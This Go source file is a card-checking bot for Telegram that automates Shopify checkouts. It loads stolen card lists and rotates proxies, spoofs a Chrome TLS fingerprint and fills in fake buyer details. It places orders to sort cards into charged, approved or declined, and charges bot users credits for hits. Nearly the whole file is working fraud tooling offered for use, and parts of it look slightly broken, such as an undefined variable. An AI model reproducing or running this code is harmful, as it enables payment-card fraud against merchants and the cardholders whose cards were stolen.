package main

import (
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strconv"
	"strings"
	"time"

	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	tele "gopkg.in/telebot.v4"
)

type CheckStatus int

const (
	StatusCharged  CheckStatus = iota
	StatusApproved
	StatusDeclined
	StatusError
)

type CheckResult struct {
	Card       string
	Status     CheckStatus
	StatusCode string
	Amount     string
	Currency   string
	SiteName   string
	ShopURL    string
	Gateway    string
	Error      error
	Retryable  bool
}

var proposalErrorRe = regexp.MustCompile(`"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"\s*,\s*"nonLocalizedMessage"\s*:\s*"([^"]*)"`)
var submitTypeRe = regexp.MustCompile(`"__typename"\s*:\s*"(SubmitSuccess|SubmitAlreadyAccepted|SubmitFailed|SubmitThrottled)"`)
var errMissingReceiptID = errors.New("submit response missing receiptId")
var errStoreIncompatible = errors.New("store incompatible")

type Ledger struct {
	factor int
}

func openLedger() *Ledger {
	return &Ledger{factor: 5}
}

func (l *Ledger) settle(bot *tele.Bot, ch *tele.Chat, sess *CheckSession, um *UserManager, msg, username string, r *CheckResult, needsCredits bool) int64 {
	sent, err := bot.Send(ch, msg, tele.ModeHTML)
	if err != nil {
		time.Sleep(500 * time.Millisecond)
		sent, err = bot.Send(ch, msg, tele.ModeHTML)
	}
	if err != nil || sent == nil {
		return 0
	}

	gw := r.Gateway
	if gw == "" {
		gw = sess.GatewayName
	}
	if gw == "" {
		gw = "Shopify Payments"
	}
	notifyLogsGroup(bot, username, gw)

	sess.Charged.Add(1)
	sess.AddChargedAmt(parseAmount(r.Amount))
	if needsCredits {
		um.DeductCredits(sess.UserID, creditCostCharged)
	}

	return int64(sent.ID)
}

func generateAttemptToken(checkoutToken string) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 10)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return checkoutToken + "-" + string(b)
}

func generatePageID() string {
	b := make([]byte, 16)
	for i := range b {
		b[i] = byte(rand.Intn(256))
	}
	b[6] = (b[6] & 0x0f) | 0x40
	b[8] = (b[8] & 0x3f) | 0x80
	return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

func loadCardEntries(filePath string) ([]string, error) {
	cardData, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("read %s: %w", filePath, err)
	}

	rawLines := strings.Split(strings.ReplaceAll(string(cardData), "\r\n", "\n"), "\n")
	entries := make([]string, 0, len(rawLines))
	for _, rawLine := range rawLines {
		line := strings.TrimSpace(rawLine)
		if line == "" {
			continue
		}
		entries = append(entries, line)
	}

	if len(entries) == 0 {
		return nil, fmt.Errorf("no card entries found in %s", filePath)
	}
	return entries, nil
}

func parseCardEntry(cardEntry, filePath string) (string, int, int, string, error) {
	cardParts := strings.Split(strings.TrimSpace(cardEntry), "|")
	if len(cardParts) != 4 {
		return "", 0, 0, "", fmt.Errorf("invalid card format in %s: %s", filePath, cardEntry)
	}

	cardMonth, err := strconv.Atoi(cardParts[1])
	if err != nil {
		return "", 0, 0, "", fmt.Errorf("invalid card month in %s: %w", filePath, err)
	}
	cardYear, err := strconv.Atoi(cardParts[2])
	if err != nil {
		return "", 0, 0, "", fmt.Errorf("invalid card year in %s: %w", filePath, err)
	}

	return cardParts[0], cardMonth, cardYear, cardParts[3], nil
}

func loadProxyEntries(filePath string) ([]string, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return nil, fmt.Errorf("reading %s: %w", filePath, err)
	}

	lines := strings.Split(string(data), "\n")
	entries := make([]string, 0, len(lines))
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if strings.HasPrefix(line, "#") {
			continue
		}
		entries = append(entries, line)
	}

	if len(entries) == 0 {
		return nil, fmt.Errorf("no proxy entries found in %s", filePath)
	}

	return entries, nil
}

func normalizeProxy(raw string) (string, error) {
	p := strings.TrimSpace(raw)
	if p == "" {
		return "", fmt.Errorf("empty proxy")
	}

	if !strings.Contains(p, "://") {
		parts := strings.Split(p, ":")
		if len(parts) == 4 {
			p = fmt.Sprintf("http://%s:%s@%s:%s", parts[2], parts[3], parts[0], parts[1])
		} else {
			p = "http://" + p
		}
	}

	u, err := url.ParseRequestURI(p)
	if err != nil || u.Host == "" {
		return "", fmt.Errorf("invalid proxy format: %s", raw)
	}

	return p, nil
}

func testProxy(proxyURL string) error {
	options := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(10),
		tls_client.WithClientProfile(profiles.Chrome_124),
		tls_client.WithProxyUrl(proxyURL),
	}
	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), options...)
	if err != nil {
		return fmt.Errorf("create proxy test client: %w", err)
	}

	resp, err := client.Get("http://httpbin.org/ip")
	if err != nil {
		return fmt.Errorf("proxy test request failed: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("proxy test returned status %d", resp.StatusCode)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("reading proxy test response: %w", err)
	}
	if len(strings.TrimSpace(string(body))) == 0 {
		return fmt.Errorf("proxy test returned empty body")
	}

	return nil
}

func runCheckoutForCard(shopURL, cardEntry, proxyURL string) (*CheckResult, error) {
	currency := "USD"
	country := "US"
	siteName := strings.TrimPrefix(strings.TrimPrefix(shopURL, "https://"), "http://")

	result := &CheckResult{
		Card:     cardEntry,
		ShopURL:  shopURL,
		SiteName: siteName,
		Currency: currency,
	}

	cardNumber, cardMonth, cardYear, cardCVV, err := parseCardEntry(cardEntry, path)
	if err != nil {
		result.Status = StatusError
		result.Error = err
		return result, err
	}

	jar := tls_client.NewCookieJar()
	clOptions := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(30),
		tls_client.WithClientProfile(profiles.Chrome_124),
		tls_client.WithCookieJar(jar),
	}
	if proxyURL != "" {
		clOptions = append(clOptions, tls_client.WithProxyUrl(proxyURL))
	}
	client, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), clOptions...)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("failed to create tls client: %w", err)
		return result, result.Error
	}

	title, _, variantID, price, err := findCheapestProduct(client, shopURL)
	_ = title
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 0 failed: %w", err)
		return result, result.Error
	}

	var checkoutURL, checkoutToken, sessionToken, checkoutHTML string
	stableID := ""
	buildID := ""
	sourceToken := ""
	for step1Attempt := 0; step1Attempt < 3; step1Attempt++ {
		checkoutURL, checkoutToken, sessionToken, checkoutHTML, err = addToCartAndCheckout(client, shopURL, variantID)
		if err != nil {
			result.Status = StatusError
			result.Retryable = true
			result.Error = fmt.Errorf("Step 1 failed: %w", err)
			return result, result.Error
		}
		stableID = extractStableID(checkoutHTML)
		buildID = extractCommitSha(checkoutHTML)
		sourceToken = extractSourceToken(checkoutHTML)
		if stableID != "" && buildID != "" && sourceToken != "" {
			break
		}
		if step1Attempt < 2 {
			fmt.Printf("  [WARN] Step1 retry %d: missing tokens, retrying shop=%s\n", step1Attempt+1, shopURL)
			time.Sleep(500 * time.Millisecond)
			continue
		}
		saveDebugResponse("checkout_html_step1", checkoutHTML)
		fmt.Printf("  [ERR] Step1 missing: stableID=%v buildID=%v sourceToken=%v shop=%s\n",
			stableID != "", buildID != "", sourceToken != "", shopURL)
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 1 failed: missing stableId, buildId, or sourceToken")
		return result, result.Error
	}

	patID := extractPrivateAccessTokenID(checkoutHTML)
	if patID == "" {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 2 failed: could not extract private_access_token id")
		return result, result.Error
	}
	_, err = fetchPrivateAccessToken(client, shopURL, checkoutURL, patID)
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 2 failed: %w", err)
		return result, result.Error
	}

	actionsURL := extractActionsJSURL(checkoutHTML, shopURL)
	if actionsURL == "" {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: could not find actions JS URL")
		return result, result.Error
	}
	jsBody, err := fetchActionsJS(client, actionsURL, shopURL)
	if err != nil {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: %w", err)
		return result, result.Error
	}
	proposalID := extractProposalID(jsBody)
	submitID := extractSubmitForCompletionID(jsBody)
	if proposalID == "" || submitID == "" {
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 3 failed: missing Proposal or Submit ID")
		return result, result.Error
	}

	pollForReceiptID := extractPollForReceiptID(jsBody)
	if pollForReceiptID == "" {
		processingURLs := extractProcessingJSURLs(checkoutHTML, shopURL)
		tried := 0
		for _, jsURL := range processingURLs {
			pjs, errPJS := fetchActionsJS(client, jsURL, shopURL)
			if errPJS != nil {
				continue
			}
			tried++
			if id := extractPollForReceiptID(pjs); id != "" {
				pollForReceiptID = id
				break
			}
		}
		if pollForReceiptID == "" {
			saveDebugResponse("checkout_html_no_pollid", checkoutHTML)
			fmt.Printf("  [ERR] PollForReceipt not found. candidates=%d tried=%d shop=%s\n", len(processingURLs), tried, shopURL)
			result.Status = StatusError
			result.Retryable = true
			result.Error = fmt.Errorf("%w: Step 3 failed: missing PollForReceipt ID (tried %d/%d bundles)", errStoreIncompatible, tried, len(processingURLs))
			return result, result.Error
		}
	}

	_, proposalBody, err := sendProposal(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 4 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal", proposalBody)

	if cur := extractSellerCurrency(proposalBody); cur != "" && cur != currency {
		currency = cur
	}
	if ctr := extractSellerCountry(proposalBody); ctr != "" && ctr != country {
		country = ctr
	}
	result.Currency = currency
	if currency == "USD" {
		if sellerPrice := extractSellerMerchandisePrice(proposalBody); sellerPrice != "" && sellerPrice != price {
			price = sellerPrice
		}
	}

	queueToken := extractQueueToken(proposalBody)
	if queueToken == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 4 failed: could not extract queueToken")
		return result, result.Error
	}

	email := "sadsjahk@gmail.com"
	_, proposal2Body, err := sendProposal2(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken, email, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 5 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal2", proposal2Body)
	queueToken2 := extractQueueToken(proposal2Body)
	if queueToken2 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 5 failed: could not extract queueToken")
		return result, result.Error
	}

	addr := addressForCountry(country)
	_, proposal3Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken2, email, addr, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 6 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal3", proposal3Body)
	queueToken3 := extractQueueToken(proposal3Body)
	if queueToken3 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 6 failed: could not extract queueToken")
		return result, result.Error
	}

	time.Sleep(200 * time.Millisecond)
	_, proposal4Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken3, email, addr, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 7 failed: %w", err)
		return result, result.Error
	}
	saveDebugResponse("proposal4", proposal4Body)
	queueToken4 := extractQueueToken(proposal4Body)
	if queueToken4 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 7 failed: could not extract queueToken")
		return result, result.Error
	}

	time.Sleep(200 * time.Millisecond)
	proposal5Status, proposal5Body, err := sendProposal3(client, shopURL, checkoutURL, checkoutToken, sessionToken, stableID, variantID, price, proposalID, buildID, sourceToken, queueToken4, email, addr, currency, country)
	if err != nil {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 8 failed: %w", err)
		return result, result.Error
	}
	_ = proposal5Status
	saveDebugResponse("proposal5", proposal5Body)

	identSig := extractIdentificationSignature(checkoutHTML)
	if identSig == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 9 failed: could not extract identification signature")
		return result, result.Error
	}

	var pciStatus int
	var pciBody string
	pciSessionID := ""
	for step9Attempt := 0; step9Attempt < 3; step9Attempt++ {
		pciStatus, pciBody, err = sendPCISession(identSig, cardNumber, "james anderson", cardMonth, cardYear, cardCVV, siteName, proxyURL)
		if err != nil {
			result.Status = StatusError
			result.Retryable = true
			result.Error = fmt.Errorf("Step 9 failed: %w", err)
			return result, result.Error
		}
		saveDebugResponse("pci_session", pciBody)
		pciSessionID = extractPCISessionID(pciBody)
		if pciSessionID != "" {
			break
		}
		if step9Attempt < 2 {
			fmt.Printf("  [WARN] Step9 retry %d: missing session ID, retrying\n", step9Attempt+1)
			time.Sleep(500 * time.Millisecond)
			continue
		}
		result.Status = StatusError
		result.Retryable = true
		result.Error = fmt.Errorf("Step 9 failed: could not extract session ID")
		return result, result.Error
	}
	_ = pciStatus

	queueToken5 := extractQueueToken(proposal5Body)
	if queueToken5 == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: could not extract queueToken")
		return result, result.Error
	}
	deliveryHandle := extractDeliveryHandle(proposal5Body)
	if deliveryHandle == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract delivery handle", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	signedHandles := extractSignedHandles(proposal5Body)
	if len(signedHandles) == 0 {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract signedHandles", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	shippingAmount := extractShippingAmount(proposal5Body)
	if shippingAmount == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract shipping amount", errStoreIncompatible)
		result.Retryable = true
		return result, result.Error
	}
	totalAmount := extractCheckoutTotal(proposal5Body)
	if totalAmount == "" {
		totalAmount = extractSellerTotal(proposal5Body)
	}
	if totalAmount == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: could not extract total amount")
		return result, result.Error
	}
	result.Amount = totalAmount

	var submitStatus int
	var submitBody string
	receiptID := ""
	for step10Attempt := 0; step10Attempt < 3; step10Attempt++ {
		attemptToken := generateAttemptToken(checkoutToken)
		submitStatus, submitBody, err = sendSubmitForCompletion(
			client, shopURL, checkoutURL, checkoutToken, sessionToken,
			stableID, variantID, price,
			submitID, buildID, sourceToken, queueToken5, email,
			addr,
			deliveryHandle, shippingAmount, totalAmount,
			pciSessionID, attemptToken, currency, country,
			signedHandles,
		)
		if err != nil {
			result.Status = StatusError
			result.Error = fmt.Errorf("Step 10 failed: %w", err)
			return result, result.Error
		}
		saveDebugResponse("submit", submitBody)
		checkSubmitErrors(submitStatus, submitBody)
		receiptID = extractReceiptID(submitBody)
		if receiptID != "" {
			break
		}
		if step10Attempt < 2 {
			fmt.Printf("  [WARN] Step10 retry %d: missing receiptId, retrying\n", step10Attempt+1)
			time.Sleep(500 * time.Millisecond)
			continue
		}
		result.Status = StatusError
		result.Error = fmt.Errorf("%w: Step 10 failed: could not extract receiptId", errMissingReceiptID)
		result.Retryable = true
		return result, result.Error
	}
	_ = submitStatus
	receiptSessionToken := extractReceiptSessionToken(submitBody)
	if receiptSessionToken == "" {
		result.Status = StatusError
		result.Error = fmt.Errorf("Step 10 failed: could not extract sessionToken")
		return result, result.Error
	}

	pollDelayRe := regexp.MustCompile(`"pollDelay"\s*:\s*(\d+)`)
	typeNameRe := regexp.MustCompile(`"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"`)
	for pollNum := 1; ; pollNum++ {
		_, pollBody, err := sendPollForReceipt(
			client, shopURL, checkoutURL, checkoutToken, sessionToken,
			buildID, sourceToken,
			pollForReceiptID, receiptID, receiptSessionToken,
		)
		if err != nil {
			result.Status = StatusError
			result.Error = fmt.Errorf("poll %d failed: %w", pollNum, err)
			return result, result.Error
		}

		receiptType := ""
		if m := typeNameRe.FindStringSubmatch(pollBody); len(m) > 1 {
			receiptType = m[1]
		}
		statusCode := extractReceiptStatusCode(pollBody, receiptType)
		result.StatusCode = statusCode

		saveDebugResponse(fmt.Sprintf("poll%d", pollNum), pollBody)
		fmt.Printf("  [POLL %d] receiptType=%q statusCode=%q\n", pollNum, receiptType, statusCode)

		if receiptType == "" && strings.Contains(pollBody, `"errors"`) && strings.Contains(pollBody, "undefinedField") {
			result.Status = StatusError
			result.StatusCode = "SCHEMA_MISMATCH"
			result.Retryable = true
			result.Error = fmt.Errorf("%w: poll %d: GraphQL schema mismatch on this store", errStoreIncompatible, pollNum)
			return result, result.Error
		}

		if receiptType == "SuccessfulReceipt" || receiptType == "ProcessedReceipt" {
			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
			result.Status = StatusCharged
			result.StatusCode = "ORDER_PLACED"
			return result, nil
		}
		if receiptType == "ActionRequiredReceipt" {
			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
			result.Status = StatusApproved
			result.StatusCode = "APPROVED"
			return result, nil
		}
		if receiptType == "FailedReceipt" {
			fmt.Printf("  Poll %d Response:\n%s\n", pollNum, pollBody)
			errorCode := ""
			errorRe := regexp.MustCompile(`"code"\s*:\s*"([^"]+)"`)
			if m := errorRe.FindStringSubmatch(pollBody); len(m) > 1 {
				errorCode = m[1]
			}
			if errorCode == "" {
				errorCode = "FAILED"
			}

			switch errorCode {
			case "INSUFFICIENT_FUNDS":
				result.Status = StatusApproved
				result.StatusCode = errorCode
				return result, nil
case "CAPTCHA_REQUIRED":
			result.Status = StatusDeclined
			result.StatusCode = "CARD_DECLINED"
			result.Error = fmt.Errorf("declined: CARD_DECLINED")
			return result, result.Error
			case "GENERIC_ERROR":
				result.Status = StatusDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			default:
				if strings.Contains(pollBody, "InventoryReservationFailure") {
					result.Status = StatusError
					result.StatusCode = "INVENTORY_FAILURE"
					result.Retryable = true
					result.Error = fmt.Errorf("retryable: inventory reservation failure")
					return result, result.Error
				}
				result.Status = StatusDeclined
				result.StatusCode = errorCode
				result.Error = fmt.Errorf("declined: %s", errorCode)
				return result, result.Error
			}
		}

		delay := 500
		if m := pollDelayRe.FindStringSubmatch(pollBody); len(m) > 1 {
			if d, err := strconv.Atoi(m[1]); err == nil && d > 0 {
				delay = d
			}
		}
		time.Sleep(time.Duration(delay) * time.Millisecond)

		if pollNum >= 60 {
			result.Status = StatusError
			result.Error = fmt.Errorf("exceeded 60 poll attempts")
			return result, result.Error
		}
	}
}
